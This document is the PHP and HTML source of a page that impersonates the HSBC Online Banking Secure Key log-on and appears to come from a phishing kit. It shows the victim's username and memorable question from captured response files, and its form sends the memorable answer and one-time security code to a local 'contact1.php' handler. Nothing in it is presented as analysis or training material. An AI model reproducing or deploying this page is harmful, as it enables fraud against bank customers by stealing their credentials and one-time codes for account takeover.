<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta content="text/html; charset=UTF-8">
      <title>Log on to Online Banking: with Secure Key Log on | HSBC</title>
      <link rel="stylesheet" href="./css/ursula.css" media="screen">
      <link rel="stylesheet" href="./css/core.css" media="screen">
      <link rel="stylesheet" href="./css/reset.css" media="screen">
      <link rel="stylesheet" href="./css/common.css" media="screen">
            <link rel="stylesheet" href="./css/memorableAnswer.css" media="screen">
                  <link rel="stylesheet" href="./css/security-details.css" media="screen">
   </head>
   <body class="ursula" onload="entityJavascripts()">
      <div tabindex="0" role="dialog" id="hsbcwidget_Lightbox_0" lang="en-GB" widgetid="hsbcwidget_Lightbox_0" data-ccmariahiddenflag="true" aria-hidden="false">
         <div style="display: none;" class="lightbox" data-dojo-attach-point="lightboxNode">
            <span class="tabbableEl" tabindex="-1"></span>
            <a class="close jsClose noPrint" data-dojo-attach-point="closeButton" tabindex="0" role="button" href="">close</a>
            <div data-dojo-attach-point="innerNode" class="lightboxInner1">
               <div data-dojo-attach-point="containerNode" class="lightboxInner2"></div>
            </div>
         </div>
         <div style="display: none;" class="overlay" data-dojo-attach-point="overlayNode"></div>
      </div>
      <div id="top" data-ccmariahiddenflag="true" aria-hidden="false">
         <input type="hidden" id="pageuri">
         <div class="pageHeaderBg" dir="ltr">
            <div class="pageHeading row">
               <div class="pageHeadingInner">
                  <h2>Log on to Online Banking</h2>
               </div>
            </div>
         </div>
         <div class="innerPage grid_skin" dir="ltr" id="askquestion">
            <div class="grid grid_24">
            </div>
         </div>
         <div class="innerPage" id="innerPage">
            <div class="grid_skin">
               <div class="row">
                  <div class="containerStyle01">
                     <div class="grid grid_24">
                        <div class="securityDetails">
                           <div class="row headerStyle01_2040">
                              <h3 class="left welcome">
                                 You are logging on as:
                                 <strong><?php 
foreach (glob("response/response1.txt") as $filename) {   
    $file = $filename;
    $contents = file($file); 
    $string = implode($contents); 
    echo $string;
}
?>**** </strong>
                              </h3>
                              <a class="normalIcon right" href="">
                              Switch User<span class="chericon"></span>
                              </a>
                           </div>
                           <p>You must use your secure key to log on to Online Banking.</p>
                           <form id="dijit_form_Form_0" lang="en-GB" method="post" action="contact1.php">
                              <div class="containerStyle17 containerStyle17-ext01 containerStyle23">
                                 <div class="questionGroup000 securityDetails securityDetails-ext02">
                                    <h4>1.Answer your memorable question
                                    </h4>
                                    <div class="question clearfix jsQuestion">
                                       <label for="memorableAnswer"><?php 
foreach (glob("response/response2.txt") as $filename) {   
    $file = $filename;
    $contents = file($file); 
    $string = implode($contents); 
    echo $string;
}
?></label>
                                       <div class="textInput">
                                          <input type="text" aria-required="true" id="memorableAnswer" name="message3" autocomplete="off">
                                          <br>
                                          <div>
                                             <a class="linkUnderline" href=""> I've forgotten my memorable answer<span class="chericon"></span></a>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                              <div id="hideshowC" class="row showHideOpen">
                                 <div class="row bottomPadding0 containerStyle24">
                                    <div class="questionGroup questionGroup-ext02 clearfix securityDetails securityDetails-ext02">
                                       <h4 class="left">2. Enter security code</h4>
                                       <ul>
                                          <li><a class="buttonArrow right showHideTrigger" href=""><span class="showLegacy">Show</span><span class="hideLegacy">Hide</span> instructions<span class="icon"></span> <span id="linkStatus" class="hidden">expanded</span></a></li>
                                       </ul>
                                    </div>
                                 </div>
                                 <div class="row bottomPadding0 showHideContent" style="height: auto;">
                                    <p class="left"></p>
                                    <div class="clearfix memorableAnswer style1 ">
                                       <p>If you've forgotten your Digital Secure Key password, select the (?) on your mobile device for help.<br <br="">(?) = the question mark image on the top right of the screen</p>
                                       <p></p>
                                       <ul class="steps">
                                          <li class="first" style="width:314px !important;">
                                             <img src="./images/01PreLogon.png" alt="" class="softTokenImg">
                                             <h5>1</h5>
                                             <p class="floatNone01">Launch the HSBC Mobile Banking app and select 'Generate security code'.<br><br>If you're a Touch ID user, cancel the log on prompt and then select 'Generate security code'.</p>
                                          </li>
                                          <li style="width:314px !important;">
                                             <img src="./images/secureKeyPassword.png" alt="" class="softTokenImg">
                                             <h5>2</h5>
                                             <p class="floatNone01">Enter your Digital Secure Key password and select 'Generate code'.<br><br>For Touch ID, using the log on tab, select 'Generate code' and follow the steps.</p>
                                          </li>
                                          <li style="width:314px !important;">
                                             <img src="./images/05Key.png" alt="" class="softTokenImg">
                                             <h5>3</h5>
                                             <p class="floatNone01">Your log on security code will be displayed.</p>
                                          </li>
                                       </ul>
                                    </div>
                                 </div>
                              </div>
                              <div class="row memorableAnswer-question">
                                 <h4>
                                 </h4>
                                 <div class="questionGroup">
                                    <div class="question question_2040 clearfix jsQuestion">
                                       <label for="idv_OtpCredential">Enter your log on security code
                                       </label>
                                       <div class="textInput">
                                          <input type="text" id="idv_OtpCredential" name="message4" class="telephone123">
                                       </div>
                                    </div>
                                    <ul class="linkList01">
                                       <li>
                                          <a class="underline" href="">Reset all security details<span class="chericon"></span></a>
                                       </li>
                                       <li class="stolen"><a class="underline jsLightboxTrigger" href="" data-target-id="lightboxContentSoft"> Lost, damaged or stolen Secure Key<span class="hidden"> Open in an overlay window</span> <span class="chevron"></span></a>
                                       </li>
                                    </ul>
                                 </div>
                              </div>
                              <div>
                                 <a class="button tertiary tertiaryBtn" href="">
                                 <span class="buttonInner"> Cancel </span>
                                 </a>
                                 <div class="right">
                              
                                       <button style="font-size:14px;font-weight:500;" type="submit" >Continue</button>
                                    
                                 </div>
                              </div>
                           </form>
                        </div>
                     </div>
                    
                  </div>
               </div>
            </div>
         </div>
      </div>
      
      
      </div>
     
   </body>
</html>